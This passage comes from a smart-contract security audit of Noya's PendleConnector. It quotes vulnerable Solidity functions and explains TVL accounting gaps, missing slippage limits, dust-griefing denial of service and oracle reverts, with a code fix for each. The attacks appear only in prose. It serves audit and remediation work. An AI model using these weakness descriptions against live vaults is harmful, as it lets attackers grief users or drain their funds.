- **Incomplete holding-position registration & TVL desynchronization**: If the connector acquires `SY` and `PT` tokens without calling `supply(address(market), ...)` on that specific market—for instance, by receiving `SY`/`PT` via `addLiquidity` (from another connector) or `swapHoldings`, or by minting `SY` via `supply` on a different Pendle market that shares the same underlying `SY` token—the `PENDLE_POSITION_ID` holding position for `market` is not registered in `PositionRegistry`. When `SY` and `PT` are deposited into `market` to mint LP tokens, `_getPositionTVL` will not be invoked for `market` (or if `SY` and `PT` were tracked as standalone token holdings, their balances decrease while the newly minted `market` LP tokens are not tracked), causing the vault's reported TVL to drop by the value of the deposited tokens.
- **Trusted-position admission bypass**: Because `registry.updateHoldingPosition` is not called, `depositIntoMarket` never verifies that `market` is a trusted position for `vaultId`. A manager can pass any untrusted Pendle market—or an arbitrary contract implementing `readTokens()`, `mint()`, and `skim()`—and transfer the connector's `_SY` and `_PT` balances directly to `address(market)`.

findings.remediation:
Update `PendleConnector.depositIntoMarket` to calculate the `positionId` for `address(market)` and call `registry.updateHoldingPosition(vaultId, positionId, "", "", false)` (and update token tracking if applicable).

```solidity
    function depositIntoMarket(IPMarket market, uint256 SYamount, uint256 PTamount) external onlyManager nonReentrant {
        (IPStandardizedYield _SY, IPPrincipalToken _PT,) = IPMarket(market).readTokens();
        IERC20(address(_SY)).safeTransfer(address(market), SYamount);
        IERC20(address(_PT)).safeTransfer(address(market), PTamount);
        market.mint(address(this), SYamount, PTamount);
        market.skim();
        bytes32 positionId = registry.calculatePositionId(address(this), PENDLE_POSITION_ID, abi.encode(address(market)));
        registry.updateHoldingPosition(vaultId, positionId, "", "", false);
        emit DepositIntoMarket(address(market), SYamount, PTamount);
    }
```

findings.technical_details:
In `PendleConnector.depositIntoMarket` (lines 112–118), the connector adds liquidity to a Pendle market by executing the following steps:

```solidity
function depositIntoMarket(IPMarket market, uint256 SYamount, uint256 PTamount) external onlyManager nonReentrant {
    (IPStandardizedYield _SY, IPPrincipalToken _PT,) = IPMarket(market).readTokens();
    IERC20(address(_SY)).safeTransfer(address(market), SYamount);
    IERC20(address(_PT)).safeTransfer(address(market), PTamount);
    market.mint(address(this), SYamount, PTamount);
    market.skim();
    emit DepositIntoMarket(address(market), SYamount, PTamount);
}
```

In Pendle's `IPMarket.mint(address receiver, uint256 netSyDesired, uint256 netPtDesired)` (which delegates math to `MarketMathCore.addLiquidityCore`), the market computes the LP tokens to mint based on the current pool reserve ratio (`market.totalPt` and `market.totalSy`):

```solidity
int256 netLpByPt = (ptDesired * market.totalLp) / market.totalPt;
int256 netLpBySy = (syDesired * market.totalLp) / market.totalSy;
if (netLpByPt < netLpBySy) {
    lpToAccount = netLpByPt;
    ptUsed = ptDesired;
    syUsed = (market.totalSy * lpToAccount) / market.totalLp;
} else {
    lpToAccount = netLpBySy;
    syUsed = syDesired;
    ptUsed = (market.totalPt * lpToAccount) / market.totalLp;
}
```

This creates two closely coupled execution flaws:
1. **Unbounded Liquidity-Output Slippage and Unused Token Loss:** `depositIntoMarket` unconditionally transfers the entire `SYamount` and `PTamount` to `market` before calling `market.mint`, ignores the returned `(uint256 netLpOut, uint256 netSyUsed, uint256 netPtUsed)`, and enforces no minimum `netLpOut` (nor minimum `netSyUsed` / `netPtUsed`). Whenever `SYamount / PTamount` does not exactly match `market.totalSy / market.totalPt` at execution time, only `syUsed` and `ptUsed` are credited to `market.totalSy` and `market.totalPt`.
2. **Loss of Surplus via `market.skim()`:** Contrary to the NatSpec comment (`@dev skim allows us to get the surplus tokens`), `IPMarket.skim()` in Pendle does not refund surplus tokens to `msg.sender`; instead, it transfers any token balances in excess of `totalSy` and `totalPt` to the Pendle protocol `treasury`.

Consequently, if the market reserve ratio shifts between transaction submission and execution—either naturally or via adversarial transaction ordering (sandwich / reserve-ratio manipulation)—a large portion of `SYamount` or `PTamount` is not used to mint LP tokens and is permanently lost to the Pendle treasury when `market.skim()` is called.

findings.remediation:
Instead of transferring full desired balances directly to the low-level `IPMarket` contract and calling `market.mint` and `market.skim()`, route the liquidity addition through `pendleRouter.addLiquidityDualSyAndPt` (which calculates the exact `syUsed` and `ptUsed` amounts to pull from the connector) and enforce a `minLpOut` slippage parameter:

```solidity
    function depositIntoMarket(IPMarket market, uint256 SYamount, uint256 PTamount, uint256 minLpOut)
        external
        onlyManager
        nonReentrant
    {
        (IPStandardizedYield _SY, IPPrincipalToken _PT,) = IPMarket(market).readTokens();
        _approveOperations(address(_SY), address(pendleRouter), SYamount);
        _approveOperations(address(_PT), address(pendleRouter), PTamount);
        pendleRouter.addLiquidityDualSyAndPt(address(this), address(market), SYamount, PTamount, minLpOut);
        emit DepositIntoMarket(address(market), SYamount, PTamount);
    }
```

Alternatively, if interacting with `market` directly, pre-calculate the exact `syUsed` and `ptUsed` using `MarketMathCore.addLiquidity` before transferring tokens to `market`, and enforce a `minLpOut` check on the minted LP amount.

findings.technical_details:
In Noya's accounting architecture, `AccountingManager.TVL()` computes the vault's total assets by iterating over the active `holdingPositions` array in `PositionRegistry` via `TVLHelper.getTVL`. Each connector must maintain accurate holding position entries in `PositionRegistry` whenever assets transition between liquid ERC20 balances on the connector and external custodial staking contracts.

In `PendleConnector.sol`, `depositIntoPenpie` (lines 126–130) transfers `_amount` of `_market` LP tokens from the connector to Penpie's staking contract:

```solidity
function depositIntoPenpie(address _market, uint256 _amount) public onlyManager nonReentrant {
    _approveOperations(_market, pendleMarketDepositHelper.pendleStaking(), _amount);
    pendleMarketDepositHelper.depositMarket(_market, _amount);
    emit DepositIntoPenpie(_market, _amount);
}
```

This implementation has two closely related accounting omissions when LP tokens are staked into Penpie:

1. **Missing Position Validation and Registration (`registry.updateHoldingPosition`)**:
   In `PendleConnector`, market positions are identified by `registry.calculatePositionId(address(this), PENDLE_POSITION_ID, abi.encode(_market))`. Unlike position-entry functions such as `AerodromeConnector.supply`, `BalancerConnector.openPosition`, `LidoConnector.requestWithdrawals`, and `UNIv3Connector.openPosition`, `depositIntoPenpie` neither verifies that `_market` is a trusted position in `PositionRegistry` nor calls `registry.updateHoldingPosition(vaultId, positionId, "", "", false)`. If the connector receives `_market` LP tokens directly (e.g., via `transferPositionToAnotherConnector` / `addLiquidity` from another connector) or re-enters Penpie staking after a prior position removal, the `PENDLE_POSITION_ID` holding position is not registered in `PositionRegistry.holdingPositions`.
2. **Unreconciled Liquid-to-Custodial Balance Transition (`_updateTokenInRegistry`)**:
   Staking `_market` LP tokens debits the connector's liquid `IERC20(_market).balanceOf(address(this))` balance and credits the custodial staking balance in `pendleMarketDepositHelper.balance(_market, address(this))`. Because `depositIntoPenpie` does not update the holding position or token registry state in `PositionRegistry`, any LP tokens that were previously tracked as liquid token holdings (or transferred between connectors) are debited from the connector's ERC20 balance without ensuring the corresponding `PENDLE_POSITION_ID` position is active in `PositionRegistry` to account for the custodial Penpie stake.

As a result, the staked LP tokens in Penpie can be omitted from `AccountingManager.TVL()`, understating `totalAssets()` and corrupting ERC4626 share pricing (`previewDeposit` and `previewRedeem`) as well as vault profit calculations (`getProfit()`).

findings.remediation:
In `PendleConnector.depositIntoPenpie`, calculate the `PENDLE_POSITION_ID` position identifier for `_market` and call `registry.updateHoldingPosition` to ensure that `_market` is a trusted position for the vault and that the holding position is actively registered in `PositionRegistry` when LP tokens are staked into Penpie:

```solidity
    function depositIntoPenpie(address _market, uint256 _amount) public onlyManager nonReentrant {
        bytes32 positionId = registry.calculatePositionId(address(this), PENDLE_POSITION_ID, abi.encode(_market));
        registry.updateHoldingPosition(vaultId, positionId, "", "", false);
        _approveOperations(_market, pendleMarketDepositHelper.pendleStaking(), _amount);
        pendleMarketDepositHelper.depositMarket(_market, _amount);
        emit DepositIntoPenpie(_market, _amount);
    }
```

findings.technical_details:
In `PendleConnector.sol`, the `withdrawFromPenpie` function is the sole mechanism for the vault manager to withdraw staked Pendle Market LP tokens from the Penpie protocol:

```solidity
function withdrawFromPenpie(address _market, uint256 _amount) public onlyManager nonReentrant {
    pendleMarketDepositHelper.withdrawMarketWithClaim(_market, _amount, true);
    emit WithdrawFromPenpie(_market, _amount);
}
```

`IPendleMarketDepositHelper` provides both `withdrawMarket(address _market, uint256 _amount)` and `withdrawMarketWithClaim(address _market, uint256 _amount, bool _doClaim)`. However, `PendleConnector.withdrawFromPenpie` hardcodes the `_doClaim` argument to `true` on line 138 and provides no alternative function or parameter to withdraw without claiming rewards.

When `_doClaim` is `true`, Penpie's deposit helper triggers reward harvesting from the associated rewarder contracts and transfers multiple external reward tokens to `PendleConnector`. If any reward token is paused, blacklisted, reverts on transfer, or if a rewarder contract has insufficient reward balance or encounters an execution failure, the entire `withdrawMarketWithClaim` call reverts. Because `_doClaim` cannot be set to `false`, the manager (including `emergencyManager`) is unable to bypass the failing reward distribution to recover the underlying LP principal.

findings.remediation:
Allow the caller to specify the `_doClaim` parameter in `withdrawFromPenpie` (or use `withdrawMarket` when `_doClaim` is `false`) so that principal withdrawals can be decoupled from reward claiming when necessary.

```solidity
    function withdrawFromPenpie(address _market, uint256 _amount, bool _doClaim) public onlyManager nonReentrant {
        pendleMarketDepositHelper.withdrawMarketWithClaim(_market, _amount, _doClaim);
        emit WithdrawFromPenpie(_market, _amount);
    }
```

findings.technical_details:
In the Noya architecture, `AccountingManager.TVL()` calculates the vault's total value locked by iterating through all registered `HoldingPI` entries in `PositionRegistry` via `TVLHelper.getTVL()`. Standard ERC20 tokens held by a connector are valued through holding positions of type `0` (calculated by `AccountingManager` and registered via `BaseConnector._updateTokenInRegistry`).

In `PendleConnector.sol`, `claimRewards` explicitly registers claimed market reward tokens in the registry so they are included in TVL:

```solidity
function claimRewards(IPMarket market) external onlyManager nonReentrant {
    market.redeemRewards(address(this));
    address[] memory rewardTokens = market.getRewardTokens();
    for (uint256 i = 0; i < rewardTokens.length; i++) {
        _updateTokenInRegistry(rewardTokens[i]);
    }
    emit ClaimRewards(address(market));
}
```

However, in `PendleConnector.withdrawFromPenpie` (lines 137–140):

```solidity
function withdrawFromPenpie(address _market, uint256 _amount) public onlyManager nonReentrant {
    pendleMarketDepositHelper.withdrawMarketWithClaim(_market, _amount, true);
    emit WithdrawFromPenpie(_market, _amount);
}
```

`pendleMarketDepositHelper.withdrawMarketWithClaim(_market, _amount, true)` is invoked with `_doClaim = true`. This instructs Penpie's deposit helper (`IPendleMarketDepositHelper`) to withdraw the staked Pendle LP tokens and simultaneously harvest all accrued reward tokens (such as PENDLE, PNP, and any bonus reward tokens from the Penpie rewarder) to `PendleConnector`.

Because `withdrawFromPenpie` neither sets `_doClaim` to `false` nor calls `_updateTokenInRegistry` for the claimed reward tokens (and `PendleConnector._getPositionTVL` only accounts for SY, LP, PT, and YT balances), the newly claimed reward tokens sit in `PendleConnector` unregistered. Until a manager separately calls `updateTokenInRegistry` for each reward token, their value is completely excluded from `TVLHelper.getTVL()` and `AccountingManager.TVL()`.

findings.remediation:
Update `withdrawFromPenpie` to register the reward tokens received from Penpie in `PositionRegistry` via `_updateTokenInRegistry` (or allow specifying/querying the reward tokens from the Penpie rewarder / market, or disable automatic claiming if rewards are handled separately).

```solidity
    function withdrawFromPenpie(address _market, uint256 _amount) public onlyManager nonReentrant {
        pendleMarketDepositHelper.withdrawMarketWithClaim(_market, _amount, true);
        address[] memory rewardTokens = IPMarket(_market).getRewardTokens();
        for (uint256 i = 0; i < rewardTokens.length; i++) {
            _updateTokenInRegistry(rewardTokens[i]);
        }
        emit WithdrawFromPenpie(_market, _amount);
    }
```

Alternatively, if Penpie distributes additional reward tokens beyond `IPMarket(_market).getRewardTokens()` (such as PNP), query the reward token list from the associated Penpie rewarder contract and call `_updateTokenInRegistry` for each token, or call `withdrawMarket(_market, _amount)` (`_doClaim = false`) and claim rewards through a dedicated function that updates all reward tokens in the registry.

findings.technical_details:
In Noya's accounting architecture, a connector's assets are valued by iterating through the vault's active `holdingPositions` in `PositionRegistry`. For `PendleConnector`, two types of holding positions are relevant:

1. **Market Position (`PENDLE_POSITION_ID`)**: Added in `supply()` via `registry.updateHoldingPosition(...)`. Its value is computed by `PendleConnector._getPositionTVL`, which sums the value of `SY`, `LP` (held directly and in Penpie), `PT`, and `YT` tokens held by the connector, converted into `_underlyingToken` and then into the vault's `base` token. Crucially, `_getPositionTVL` does not include the connector's raw `_underlyingToken` ERC20 balance.
2. **Token Holding Position (`positionTypeId == 0`)**: Managed via `BaseConnector._updateTokenInRegistry(address token)`, which registers or removes a token holding position (`calculatePositionId(accountingManager, 0, abi.encode(token))`) depending on whether `IERC20(token).balanceOf(address(this)) == 0`.

In `PendleConnector.decreasePosition` (lines 216–233):

```solidity
function decreasePosition(IPMarket market, uint256 _amount, bool closePosition) external onlyManager nonReentrant {
    (IPStandardizedYield SY,,) = market.readTokens();
    (, address _underlyingToken,) = SY.assetInfo();

    // redeems an amount of base tokens by burning SY
    IERC20(address(SY)).safeTransfer(address(SY), _amount);
    IPStandardizedYield(address(SY)).redeem(address(this), _amount, _underlyingToken, 1, true);
    if (closePosition && isMarketEmpty(market)) {
        registry.updateHoldingPosition(
            vaultId,
            registry.calculatePositionId(address(this), PENDLE_POSITION_ID, abi.encode(market)),
            "",
            "",
            true
        );
    }
    emit DecreasePosition(address(market), _amount, closePosition);
}
```

When `SY.redeem(...)` executes, `_amount` of `SY` is burned and `_underlyingToken` is transferred to `PendleConnector`. This immediately reduces `SY.balanceOf(address(this))` (and removes the `PENDLE_POSITION_ID` holding position entirely if `closePosition && isMarketEmpty(market)` evaluates to `true`). However, `decreasePosition` never calls `_updateTokenInRegistry(_underlyingToken)` to register the newly received `_underlyingToken` in `PositionRegistry`.

If `PendleConnector` previously had a zero balance of `_underlyingToken` (for instance, after supplying its entire `_underlyingToken` balance into the Pendle market and updating the registry), the token holding position for `_underlyingToken` is not active in `PositionRegistry`. Consequently, after `decreasePosition` completes, the redeemed `_underlyingToken` sits in `PendleConnector` without a corresponding holding position in `PositionRegistry`, causing the vault's TVL to exclude the redeemed funds.

findings.remediation:
Call `_updateTokenInRegistry(_underlyingToken)` in `PendleConnector.decreasePosition` after redeeming `SY` tokens so that the connector's `_underlyingToken` holding position is properly tracked in `PositionRegistry`.

```solidity
    function decreasePosition(IPMarket market, uint256 _amount, bool closePosition) external onlyManager nonReentrant {
        (IPStandardizedYield SY,,) = market.readTokens();
        (, address _underlyingToken,) = SY.assetInfo();

        // redeems an amount of base tokens by burning SY
        IERC20(address(SY)).safeTransfer(address(SY), _amount);
        IPStandardizedYield(address(SY)).redeem(address(this), _amount, _underlyingToken, 1, true);
        if (closePosition && isMarketEmpty(market)) {
            registry.updateHoldingPosition(
                vaultId,
                registry.calculatePositionId(address(this), PENDLE_POSITION_ID, abi.encode(market)),
                "",
                "",
                true
            );
        }
        _updateTokenInRegistry(_underlyingToken);
        emit DecreasePosition(address(market), _amount, closePosition);
    }
```

findings.technical_details:
When a vault manager exits a Pendle market position via `PendleConnector.decreasePosition(IPMarket market, uint256 _amount, bool closePosition)`, the connector only removes the market's holding position from the `PositionRegistry` if `closePosition && isMarketEmpty(market)` evaluates to `true` (lines 223–231):

```solidity
    function isMarketEmpty(IPMarket market) public view returns (bool) {
        (IPStandardizedYield _SY, IPPrincipalToken _PT, IPYieldToken _YT) = IPMarket(market).readTokens();
        return (
            _SY.balanceOf(address(this)) == 0 && _PT.balanceOf(address(this)) == 0 && _YT.balanceOf(address(this)) == 0
                && market.balanceOf(address(this)) == 0
        );
    }
```

Because `_SY`, `_PT`, `_YT`, and `market` (`LP`) are standard ERC20 tokens and `isMarketEmpty` requires all four balances to be strictly equal to `0`, the check fails to return `true` under several practical conditions:

1. **Unsolicited Token-Balance Contamination (Dust Griefing):** Any external actor can transfer `1 wei` of `_SY`, `_PT`, `_YT`, or `market` LP tokens directly to `PendleConnector` before or during position closure.
2. **Unredeemable Residual Dust:** In `decreasePosition`, `SY.redeem(address(this), _amount, _underlyingToken, 1, true)` enforces `minTokenOut = 1`. When `_underlyingToken` has fewer decimals than `SY` (e.g., 6-decimal USDT or USDC versus 18-decimal `SY`), any residual `SY` balance smaller than the decimal scaling factor (e.g., `< 1e12` wei of `SY`) rounds down to `0` underlying tokens and reverts with `SYInsufficientTokenOut(0, 1)`, making it impossible to reduce `_SY.balanceOf(address(this))` to `0`.
3. **Expired Yield Token (`YT`) Cleanup Barrier:** If the connector holds `YT` until market maturity (`block.timestamp >= market.expiry()`), `YT` becomes worthless and Pendle's market/router swap functions (`swapYTForPT`, `swapYTForSY`) revert with `MarketExpired()`. `PendleConnector` does not expose `redeemPY` or any mechanism to dispose of expired `YT`, leaving `_YT.balanceOf(address(this)) > 0` permanently.

Consequently, `isMarketEmpty(market)` permanently returns `false`, and `registry.updateHoldingPosition(..., true)` cannot be executed to deregister the `PENDLE_POSITION_ID` position from `vault.holdingPositions`.

findings.remediation:
Ignore expired `YT` balances (which have zero value post-expiry) and compare the remaining token balances (or their underlying/base token values) against a dust threshold rather than strict equality to zero (`== 0`), while also checking staked Penpie LP balances:

```solidity
    function isMarketEmpty(IPMarket market) public view returns (bool) {
        (IPStandardizedYield _SY, IPPrincipalToken _PT, IPYieldToken _YT) = IPMarket(market).readTokens();
        uint256 ytBalance = _YT.isExpired() ? 0 : _YT.balanceOf(address(this));
        return (
            _SY.balanceOf(address(this)) <= DUST_LEVEL && _PT.balanceOf(address(this)) <= DUST_LEVEL
                && ytBalance <= DUST_LEVEL && market.balanceOf(address(this)) <= DUST_LEVEL
                && pendleMarketDepositHelper.balance(address(market), address(this)) <= DUST_LEVEL
        );
    }
```

findings.technical_details:
In `PendleConnector`, a vault's market position is tracked as a single holding position in `PositionRegistry` with `positionTypeId = PENDLE_POSITION_ID` and `abi.encode(market)`. As seen in `_getPositionTVL` (lines 268–272), the connector can hold LP tokens for a market either directly (`IERC20(market).balanceOf(address(this))`) or staked in Penpie via `depositIntoPenpie` (`pendleMarketDepositHelper.balance(market, address(this))`):

```solidity
uint256 lpBalance =
    IERC20(market).balanceOf(address(this)) + pendleMarketDepositHelper.balance(market, address(this));
```

When the manager redeems `SY` tokens in `decreasePosition` (lines 216–233) with `closePosition = true`, lines 223–231 check whether the market position is empty before removing the holding position from `PositionRegistry`:

```solidity
if (closePosition && isMarketEmpty(market)) {
    registry.updateHoldingPosition(
        vaultId,
        registry.calculatePositionId(address(this), PENDLE_POSITION_ID, abi.encode(market)),
        "",
        "",
        true
    );
}
```

Although the NatSpec for `isMarketEmpty` (line 299) states that it *"Checks whether all positions (SY, PT, YT, and LP (in the pool and in penpie)) in a given market are empty for this contract"*, its implementation (lines 303–309) only checks the direct token balances of `_SY`, `_PT`, `_YT`, and unstaked `market` LP tokens:

```solidity
function isMarketEmpty(IPMarket market) public view returns (bool) {
    (IPStandardizedYield _SY, IPPrincipalToken _PT, IPYieldToken _YT) = IPMarket(market).readTokens();
    return (
        _SY.balanceOf(address(this)) == 0 && _PT.balanceOf(address(this)) == 0 && _YT.balanceOf(address(this)) == 0
            && market.balanceOf(address(this)) == 0
    );
}
```

It omits checking `pendleMarketDepositHelper.balance(address(market), address(this)) == 0`. Therefore, whenever the connector has staked all of its LP tokens into Penpie and has no remaining unstaked `SY`, `PT`, `YT`, or `market` LP tokens after redeeming in `decreasePosition`, `isMarketEmpty(market)` erroneously returns `true`. `decreasePosition` then calls `registry.updateHoldingPosition(..., true)`, removing the market holding position from `PositionRegistry` while the connector still holds staked LP tokens in Penpie.

findings.remediation:
Check that the connector's staked LP balance in `pendleMarketDepositHelper` is also zero before treating the market as empty and closing the position.

```solidity
        if (
            closePosition && isMarketEmpty(market)
                && pendleMarketDepositHelper.balance(address(market), address(this)) == 0
        ) {
            registry.updateHoldingPosition(
                vaultId,
                registry.calculatePositionId(address(this), PENDLE_POSITION_ID, abi.encode(market)),
                "",
                "",
                true
            );
        }
```

Additionally, update `isMarketEmpty` to include `pendleMarketDepositHelper.balance(address(market), address(this)) == 0` so all callers of `isMarketEmpty` accurately account for Penpie-staked LP tokens.

Update `PendleConnector.claimRewards` to also harvest rewards from Penpie (if LP tokens are staked), claim rewards from `_SY` and `_YT`, and register all claimed reward tokens in the `PositionRegistry` (ensuring they are trusted or handled safely).

```solidity
    function claimRewards(IPMarket market) external onlyManager nonReentrant {
        (IPStandardizedYield _SY,, IPYieldToken _YT) = market.readTokens();

        market.redeemRewards(address(this));
        if (pendleMarketDepositHelper.balance(address(market), address(this)) > 0) {
            pendleMarketDepositHelper.harvest(address(market));
        }
        _SY.claimRewards(address(this));

        address[] memory rewardTokens = market.getRewardTokens();
        for (uint256 i = 0; i < rewardTokens.length; i++) {
            _updateTokenInRegistry(rewardTokens[i]);
        }

        address[] memory syRewardTokens = _SY.getRewardTokens();
        for (uint256 i = 0; i < syRewardTokens.length; i++) {
            _updateTokenInRegistry(syRewardTokens[i]);
        }

        address[] memory ytRewardTokens = _YT.getRewardTokens();
        for (uint256 i = 0; i < ytRewardTokens.length; i++) {
            _updateTokenInRegistry(ytRewardTokens[i]);
        }

        emit ClaimRewards(address(market));
    }
```

findings.technical_details:
In `PendleConnector.claimRewards(IPMarket market)` (`contracts/connectors/PendleConnector.sol`, lines 241–248), the connector claims rewards from the Pendle market and iterates through all reward tokens returned by `market.getRewardTokens()`:

```solidity
function claimRewards(IPMarket market) external onlyManager nonReentrant {
    market.redeemRewards(address(this));
    address[] memory rewardTokens = market.getRewardTokens();
    for (uint256 i = 0; i < rewardTokens.length; i++) {
        _updateTokenInRegistry(rewardTokens[i]);
    }
    emit ClaimRewards(address(market));
}
```

For each `rewardTokens[i]`, `BaseConnector._updateTokenInRegistry(address token)` (`contracts/helpers/BaseConnector.sol`, lines 135–160) checks `IERC20(token).balanceOf(address(this)) == 0`. Whenever the connector holds a non-zero balance of `rewardTokens[i]` (`remove == false`) and the token is not yet recorded in `holdingPositions` (`positionIndex == 0`), `_updateTokenInRegistry` computes:

```solidity
bytes32 positionId = registry.calculatePositionId(accountingManager, 0, abi.encode(token));
```

and calls:

```solidity
registry.updateHoldingPosition(vaultId, positionId, abi.encode(address(this)), "", false);
```

In `PositionRegistry.updateHoldingPosition` (`contracts/accountingManager/Registry.sol`, lines 344 and 305), the registry enforces that `positionId` must already be registered and enabled in `vault.trustedPositionsBP`:

```solidity
if (!vault.trustedPositionsBP[_positionId].isEnabled) revert InvalidPosition(_positionId);
```

However, there is a direct mismatch between how Pendle market positions are whitelisted and how `claimRewards` registers reward tokens:

1. When a Pendle market position (`PENDLE_POSITION_ID = 11`) is added via `PositionRegistry.addTrustedPosition`, `PendleConnector._getUnderlyingTokens` (lines 311–317) only returns the single underlying asset of the `SY` token (`SY.assetInfo()`), not the reward tokens from `market.getRewardTokens()`.
2. A Pendle market's `getRewardTokens()` returns `PENDLE` as well as any reward tokens from the underlying `SY` contract (which can include multiple protocol incentive tokens or newly added reward tokens).
3. If even a single token in `market.getRewardTokens()` has not been both whitelisted as a trusted token (`updateConnectorTrustedTokens` / `addVault`) and registered as a trusted holding position (`addTrustedPosition(vaultId, 0, accountingManager, ...)`), any non-zero balance of that token on `PendleConnector` causes `_updateTokenInRegistry(rewardTokens[i])` to revert with `InvalidPosition(positionId)`.
4. Even if an un-registered reward token in `market.getRewardTokens()` currently has zero accrued rewards from `market.redeemRewards(address(this))`, any external actor can transfer `1 wei` of that token directly to `PendleConnector`, forcing `IERC20(rewardTokens[i]).balanceOf(address(this)) > 0` and permanently DoSing `claimRewards`.

Notably, in `testFoundry/PendleConnector.t.sol` (`testDepositIntoMarketAndClaimRewards`, lines 275–301), the reward tokens of `pendleUsdtMarket` are not registered as trusted positions in `PositionRegistry`. The test only passes because all LP tokens were moved to Penpie and `claimRewards` was called in the same block with zero accrued rewards on `pendleUsdtMarket`, resulting in `balanceOf(rewardTokens[i]) == 0` (`remove = true` with `positionIndex == 0`), which skipped the `registry.updateHoldingPosition` call.

findings.remediation:
In `PendleConnector.claimRewards`, check whether the holding position for each reward token is trusted in `PositionRegistry` before calling `_updateTokenInRegistry(rewardTokens[i])` (or perform this check inside `_updateTokenInRegistry`). Additionally, ensure expected reward tokens are registered as trusted holding positions during market onboarding.

```solidity
    function claimRewards(IPMarket market) external onlyManager nonReentrant {
        market.redeemRewards(address(this));
        (address accountingManager,) = registry.getVaultAddresses(vaultId);
        address[] memory rewardTokens = market.getRewardTokens();
        for (uint256 i = 0; i < rewardTokens.length; i++) {
            bytes32 positionId = registry.calculatePositionId(accountingManager, 0, abi.encode(rewardTokens[i]));
            if (registry.isPositionTrustedForConnector(vaultId, positionId, address(this))) {
                _updateTokenInRegistry(rewardTokens[i]);
            }
        }
        emit ClaimRewards(address(market));
    }
```

findings.technical_details:
In `PendleConnector._getPositionTVL` (lines 268–275), the connector values its LP token holdings (held directly and staked in Penpie) and Principal Token (`_PT`) holdings using `PendleLpOracleLib.getLpToAssetRate` and `PendlePtOracleLib.getPtToAssetRate` with a hardcoded TWAP duration of `10` seconds:

```solidity
uint256 lpBalance =
    IERC20(market).balanceOf(address(this)) + pendleMarketDepositHelper.balance(market, address(this));
if (lpBalance > 0) {
    SYAmount += lpBalance * IPMarket(market).getLpToAssetRate(10) / 1e18;
}

uint256 PTAmount = _PT.balanceOf(address(this));
if (PTAmount > 0) SYAmount += PTAmount * IPMarket(market).getPtToAssetRate(10) / 1e18;
```

Both `getLpToAssetRate(10)` (via `PendleLpOracleLib._getPtRates`) and `getPtToAssetRate(10)` (via `PendlePtOracleLib._getMarketLnImpliedRate`) execute `market.observe(durations)` with `durations = [10, 0]`:

```solidity
function _getMarketLnImpliedRate(IPMarket market, uint32 duration) private view returns (uint256) {
    uint32[] memory durations = new uint32[](2);
    durations[0] = duration;

    uint216[] memory lnImpliedRateCumulative = market.observe(durations);
    return (lnImpliedRateCumulative[1] - lnImpliedRateCumulative[0]) / duration;
}
```

In Pendle's `IPMarket`, `observe` interpolates `lnImpliedRateCumulative` at `block.timestamp - duration` (`block.timestamp - 10`). For `market.observe` to succeed:
1. The market oracle ring buffer must be initialized (`observationCardinality > 0`, otherwise it reverts with `OracleZeroCardinality` or `OracleUninitialized`).
2. The oldest initialized observation in the market's ring buffer must have a timestamp less than or equal to `block.timestamp - 10` (`oldestObservationSatisfied == true`), otherwise `market.observe` reverts with `OracleTargetTooOld(target, oldest)`.

By default, Pendle markets are deployed with `observationCardinality = 1` and `observationCardinalityNext = 1`. `PendleConnector` never calls `IPMarket(market).increaseObservationsCardinalityNext(...)` when initializing or supplying to a market, nor does `_getPositionTVL` verify oracle readiness (such as checking `IPPtOracle.getOracleState(market, 10)`) before querying the 10-second TWAP.

When `observationCardinality == 1` (or when the cardinality is smaller than the number of blocks with trades within a 10-second window), any rate-updating interaction on the market—such as `depositIntoMarket`, `swapExactPTForSY`, `swapYTForPT`, `swapYTForSY`, or a trade by any external user—writes an observation at `block.timestamp` and overwrites the oldest observation in the buffer. Consequently, for the next 10 seconds (including within the same block), the oldest observation timestamp is newer than `block.timestamp - 10`, causing `getLpToAssetRate(10)` and `getPtToAssetRate(10)` to revert with `OracleTargetTooOld`.

Because `AccountingManager.TVL()` (via `TVLHelper.getTVL`) calls `PendleConnector.getPositionTVL` without catching reverts, any revert in `getLpToAssetRate(10)` or `getPtToAssetRate(10)` propagates and causes `AccountingManager.TVL()` to revert.

findings.remediation:
Ensure that the Pendle market's observation cardinality is expanded via `increaseObservationsCardinalityNext` when entering a market, and verify via Pendle's `IPPtOracle` (or check the observation buffer / fallback to instantaneous rates when `duration = 0` if appropriate) that the required observation history is satisfied before querying a non-zero TWAP window:

```solidity
            uint32 twapDuration = 10;
            (,, uint16 observationIndex, uint16 observationCardinality,) = _getOracleStorage(market);
            if (observationCardinality <= 1) {
                twapDuration = 0;
            } else {
                (uint32 oldestTimestamp,, bool initialized) =
                    IPMarket(market).observations((observationIndex + 1) % observationCardinality);
                if (!initialized) {
                    (oldestTimestamp,,) = IPMarket(market).observations(0);
                }
                if (block.timestamp - oldestTimestamp < twapDuration) {
                    twapDuration = uint32(block.timestamp - oldestTimestamp);
                }
            }

            uint256 lpBalance =
                IERC20(market).balanceOf(address(this)) + pendleMarketDepositHelper.balance(market, address(this));
            if (lpBalance > 0) {
                SYAmount += lpBalance * IPMarket(market).getLpToAssetRate(twapDuration) / 1e18;
            }

            uint256 PTAmount = _PT.balanceOf(address(this));
            if (PTAmount > 0) SYAmount += PTAmount * IPMarket(market).getPtToAssetRate(twapDuration) / 1e18;
```

Additionally, call `IPMarket(market).increaseObservationsCardinalityNext(...)` with a sufficient cardinality when initializing or supplying to the market in `supply()`, and ensure the market's cardinality and observation age are verified before relying on the TWAP oracle.

findings.technical_details:
In `PendleConnector._getPositionTVL`, the contract attempts to aggregate the holdings of a Pendle market position (`_SY`, `LP`, `_PT`, and `_YT`) into `SYAmount` and subsequently convert the total `SYAmount` into `underlyingBalance` using `_SY.exchangeRate()`:

```solidity
uint256 lpBalance =
    IERC20(market).balanceOf(address(this)) + pendleMarketDepositHelper.balance(market, address(this));
if (lpBalance > 0) {
    SYAmount += lpBalance * IPMarket(market).getLpToAssetRate(10) / 1e18;
}

uint256 PTAmount = _PT.balanceOf(address(this));
if (PTAmount > 0) SYAmount += PTAmount * IPMarket(market).getPtToAssetRate(10) / 1e18;

uint256 YTBalance = _YT.balanceOf(address(this));
if (YTBalance > 0) SYAmount += getYTValue(market, YTBalance);

if (SYAmount > 0) underlyingBalance += SYAmount * _SY.exchangeRate() / 1e18;
```

In Pendle, Standardized Yield (`SY`) wraps an underlying yield-bearing token where `1 SY` represents `_SY.exchangeRate() / 1e18` units of the underlying asset (`_underlyingToken`), as documented in `IPStandardizedYield`:
> `exchangeRate * syBalance / 1e18 must return the asset balance of the account`

